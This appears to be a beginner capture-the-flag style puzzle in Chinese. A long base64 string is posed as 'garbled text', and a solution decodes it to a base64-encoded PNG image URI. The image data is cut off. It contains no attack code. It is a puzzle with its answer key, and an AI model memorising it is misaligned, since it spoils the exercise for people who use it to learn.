JM0JGK3lpQ3krVTVzMmJ5eVdYWEpMU3FzZUVpUk5kY2NUR2RXSEVpQkh5a0s1eTJRcTIwTzdVclVwczE2THMxTUpGaStUenp6OFhiSk1oTWgvMUxKRUw2OVJUVDVWVE5RM0RxZW9IaHEzWStzb0F1Y2xTbFpWYUgvbXR0OTVLOWVOcGZlNU12ZWJpa1MzWVpZSXh0blhyVnRtM2YzK3M3aVZxWCs3WHg4LzZIdXAwWXE1NG9HSUE2b25DR2Q4cEg3UWZ0SzdrUHg1OE1IczRyajFIM2RaSXl4RHIycVdMNU1tVHh3ZytuRHcvKyt3ekkxMHFrUUFKa0FBSkpDZFFzR0JCYWRlMmJleUJVanZidDIrUHJRNGQwS0NvVXpRblZoRTFWckRhQklmd1ZBWEp0OTI4aVlZaENkOG8yNjNTN1BuZ0dsUzlldlhZSS9zMXQ1Ni8wQVN1ZDk1NXAxdk5XN2VMMVQxc3E5cHVyVnAzRk9jRGh3OGZsb0gzM3g4NzUrSzg3ZWhMVWJjMVVqYkVUdGNsYml3UG04cUVDUk5NVmFsSEFpUkFBaGxQQUFaUUhsM05LbUdZbnhHUmYzallianNtQW8wVmozNzkrd3RTTmJncGo2dXpmTmx5NWFSZWlsdUZibzR0dTIwRW1kMTIrKzJ5ZCsvZTdKY3k5aGtybWZmZGQxOXNXOWh0Q0psZ2E2VHNySS9jTTNEME01RlZ1cFM3ZnYxNkUxWHFrQUFKa0FBSktBR2tpYmo3cnJzRUt3OStDSXl2MjlXcC84TVBQM1M5ZTVSTkdqQmdRTXdIeXZYT1V1Z0F4NkJ2djM2eExjQVVQaDZwaitCWS9mMkJCd1ErMzE1SUp0Z2FLUmxpU0FKNHpUWFhHQjhEK0JkUVNJQUVTSUFFN0FpOHJ3bER4NDRkYS9jaEI3UmhlUFJUdzhQcEtNbEVRME9PeVI0OWVsaW50RWpVcGhQdndmZXFUNTgrc216Wk1pZWFDM1ViZS9ic2taN3FrL2VTUjVWeE1zWFdTTWtRZzA4Q25DQk5aS01XQVYyNmRLbUpLblZJZ0FSSWdBUnlFUmlqaHRnY1RXUGdsV1Q3L3J5NWVMRlhYZjYzbjUwN2QwcjM2NitYVVpwVTFLK1Z3UDhPUnY5WTgvNzdnaEpRU04yUjZZS0tDaTAxUUdTeGgrZEZwdGdhMW9ZWURMQzJhb2laeXFUSmswMVZxVWNDSkVBQ0pKQ0xBUHh4N2xWL25FRWFXWWdvT1RkbDgrYk4wcUZqUjVtckNVWDlFc3dYWlgrUVlCU3BMZnlRbkdOQUFJU2Jza3hMQTMzMzNYZHVkcEZXMi9DSjY2L2J4bmZxcWlBaVViMlNUTEkxekp5OGNwQnZvVnVTaU5ReEVVU1l2UGJhYXlhcTFDRUJFaUFCRWtoQUFJbEhzY09BZkY2cFpEOVAwSFRNd0JzM2ZyeU0xOGVoUTRjU3FYcjJIclpsVzdSc0tWZGRkWldnR0hmcDBxVmQ3eHQrY1hQVUNFWGljYStpL0ovUVFJVW5uM3hTa0xBVXFUV1FZc1NONUsyMjhKQVc0M2s5NTJDVUkyakRhOGtrVzhQS0VJTnpma2U5V3pJVkpMM0RuVVdVNU1jZmZ6U2V6a0VMWGVOR0RSUnR4b2ptYlBYakRjRzBEU1NHaExPbkY0SXhtV1RmTmgyN3paaHQyc1NGeisyb05KdXhSMEVYSzBmZ2FocFFaSE84L09TemJ0MDZhYVAxRnBGRERINjZKVXFVU0dzNHVNQmlDM0tpK3ZIaXdoczB3ZS9GODg4L0g4dCszNkJCQStuY3FaTXJhU3F3NmpORCswRVdlL2hCZVMyNFRxN1dSSzE0UEtxVkU4cVVLU01vUWw2dGFsV3BWcTJhWjRZWnZqZllnb1FCWmx0K3lrbG1tV1pyNUtsVXVienhWUkhsSVA2aDBSSW1nb1I2VFpvMnRjcjZiTkl1ZFVpQUJFZ2d6QVFXNm9XdXNDWVlUU1pZL1dyYnJsMUN0UXN1dUVCYWFJYjRCdlhyR3lkcS9lbW5uMklKU1Y5ZHNDRDJqUC9ESkVoblVLTkdqZGlqcGo3RGFMRVZwS0o0WC8yL1lQaThoMHoxSDMwVW1KWEFlSFBKeXNxS3BTV3BldmJac1lTc01NQkxsU3BsdkRzVnIwMjhobTFYR1Bmck5Lc0JucEd0SDhhdjM1SnB0b2JWaWxnWGk5cGswN1I0YU5pKzRINmZmT3lmQkVpQUJHd0lMRmYvSWp5d2dvQWNZdGl5UkozQ1l2cU1UT3BZRmR5bG1lYVI3RFg3Z1l0dm1GZGd2Lzc2NjFoSm5leXlPaWpSVTFxTmtpeDFtVGxaSDluUEoyb1MyNS9WeU55cldlYjNxZzlXN0ZsWHZuWXJqMDgxRTcxWEsvTTJ4L05vdXNpV2oxSkNlT1FVWk15SFVZWmNjd1gwNy96cXd3M2ZxdnlhVWY4RWZSeW5DVjkvVk1NcWxtMWZqVThZb05rUCtOK2hDa0VRSmROc0RXTkRESFdwVUdiQVJKRC9Cc3U4RkJJZ0FSSWdBZmNKd09DQ2dZSkhwZ20yRXYzWVRnd0NaMXhyTjIzYUZIc0VZVHhPakNFVGJRM2pxRW1VR0RDVldiTm14YXh1VTMzcWtRQUprQUFKa0FBSmtFQW0yaHBHaGhqMjQxSEx5MFRnN0RmVnc4cjBKbU9pRGdtUUFBbVFBQW1RUUxBSlpLcXRZV1NJZGV2YTFmam9ZZDkrcC9valVFaUFCRWlBQkVpQUJFakFsRUNtMmhwSkRiRUtGU3BJM2JwMWpUZ2lCSmNKWEkxUVVZa0VTSUFFU0lBRVNPQS9CRExaMWtocWlObEVMeUFmalZkSjhIajJrZ0FKa0FBSmtBQUpSSU5BSnRzYUNRMHhoTVUyYk5qUStDZ2pLU0NGQkVpQUJFaUFCRWlBQkV3SlpMcXRrZEFRYTZmSkJQUG16V3ZFY3VXcVZiSmVrOEpSU0lBRVNJQUVTSUFFU01DVVFLYmJHZ256aU1IeDNyVHN4ZHExYTAyWlU0OEVTSUFFU0lBRVNJQUVZZ1F5M2RaSWFJaWgzQUVlRkJJZ0FSSWdBUklnQVJKd2cwQ20yeG9KdHliZEFNNDJTWUFFU0lBRVNJQUVTSUFFZmlOQVE0eG5BZ21RQUFtUUFBbVFBQW40UklDR21FL2cyUzBKa0FBSmtBQUprQUFKMEJEak9VQUNKRUFDSkVBQ0pFQUNQaEdnSWVZVGVIWkxBaVJBQWlSQUFpUkFBalRFZUE2UUFBbVFBQW1RQUFtUWdFOEVhSWo1Qko3ZGtnQUprQUFKa0FBSmtBQU5NWjRESkVBQ0pFQUNKRUFDSk9BVEFScGlQb0ZudHlSQUFpUkFBaVJBQWlSQVE0em5BQW1RQUFtUUFBbVFBQW40UklDR21FL2cyUzBKa0FBSmtBQUprQUFKSkt3MVNUd2tRQUlrUUFMT0V1alpxNWNVek1wSzJ1ak9YYnVTNmxDQkJFZ2cvQVR5VktwYy9rajRwOEVaa0FBSmtBQUprQUFKa0VENENQdy9CTW1TU0lkbU1Dc0FBQUFBU1VWT1JLNUNZSUk9題目說明： 從這堆亂碼中找到答案。解答：其實這題也相當直白，不需想太多；常使用編碼的人應該能發現這堆亂碼就只是base64的字串，我們先把他 解回去 ，得到：data:image/png;base64,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